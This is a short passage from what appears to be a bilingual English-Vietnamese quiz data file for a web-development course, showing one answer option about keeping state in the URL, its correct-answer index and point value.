              'In the URL, so it survives navigation|||Trong URL, để nó sống sót qua các lần điều hướng',
            ],
            correctIndex: 1,
            points: 1,
          },
        ],
      },
    },
  ],
};
